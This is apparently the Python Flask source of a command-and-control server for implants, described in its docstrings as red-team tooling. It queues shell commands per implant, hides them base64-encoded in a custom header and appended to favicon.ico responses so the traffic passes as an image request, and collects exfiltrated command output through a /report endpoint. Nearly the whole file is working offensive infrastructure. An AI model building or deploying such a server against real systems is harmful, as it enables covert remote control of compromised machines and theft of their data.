from flask import Flask, request, make_response
import base64
import os

from db import (
    init_db, add_implant, update_checkin,
    get_pending_command, mark_command_executed,
    queue_command, store_result, get_all_results
)

app = Flask(__name__)

# Initialize the database when the server starts
init_db()

@app.route("/")
def index():
    return "Favicon C2 Server is running."

@app.route("/queue_command", methods=["POST"])
def handle_queue_command():
    """
    Allows the red-team operator to queue a command for a specific implant.
    POST JSON: { "implant_id": "XYZ", "command": "whoami" }
    """
    data = request.json
    implant_id = data.get("implant_id")
    command_str = data.get("command")
    if not implant_id or not command_str:
        return {"error": "Missing implant_id or command"}, 400

    queue_command(implant_id, command_str)
    return {"status": "queued", "implant_id": implant_id, "command": command_str}, 200

@app.route("/favicon.ico")
def favicon():
    """
    The implant fetches this route to get commands. We embed the command
    in the ICO file or a custom HTTP header.
    """
    # Identify the implant by a query parameter, e.g. /favicon.ico?i=implant123
    implant_id = request.args.get("i", "default_implant")

    # Register/update the implant
    add_implant(implant_id)
    update_checkin(implant_id)

    # Check if there's a pending command for this implant
    cmd_id, cmd_text = get_pending_command(implant_id)

    # Load the base .ico file (we'll store it in static/base_favicon.ico)
    base_ico_path = os.path.join(os.path.dirname(__file__), "static", "base_favicon.ico")
    with open(base_ico_path, "rb") as f:
        ico_data = f.read()

    # Build a response
    response = make_response(ico_data)
    response.headers["Content-Type"] = "image/x-icon"

    if cmd_text:
        # Encode the command
        encoded_cmd = base64.b64encode(cmd_text.encode()).decode()

        # Option A: Put command in a custom header
        response.headers["X-Favicon-Command"] = encoded_cmd

        # Option B: Append the command to the end of the .ico file
        appended_data = b"\x00\x00\x00CMD:" + encoded_cmd.encode()
        modified_ico = ico_data + appended_data
        response = make_response(modified_ico)
        response.headers["Content-Type"] = "image/x-icon"
        response.headers["X-Favicon-Command"] = encoded_cmd

        # Mark as executed so we don't keep sending the same command
        mark_command_executed(cmd_id)

    return response

@app.route("/report", methods=["POST"])
def report():
    """
    The implant calls this route to exfil command results.
    POST JSON: { "implant_id": "XYZ", "command": "whoami", "output": "Result data" }
    """
    data = request.json or {}
    implant_id = data.get("implant_id")
    command = data.get("command")
    output = data.get("output")

    if implant_id and command and output is not None:
        store_result(implant_id, command, output)
        return {"status": "ok"}, 200
    else:
        return {"error": "invalid data"}, 400

@app.route("/results", methods=["GET"])
def results():
    """View all stored results for debugging or demonstration."""
    rows = get_all_results()
    formatted = []
    for row in rows:
        formatted.append({
            "implant_id": row[0],
            "command": row[1],
            "output": row[2],
            "timestamp": row[3]
        })
    return {"results": formatted}, 200

if __name__ == "__main__":
    # By default, Flask runs on port 5000. 
    # debug=True is convenient for testing but not recommended in production.
    app.run(host="0.0.0.0", port=5000, debug=True)
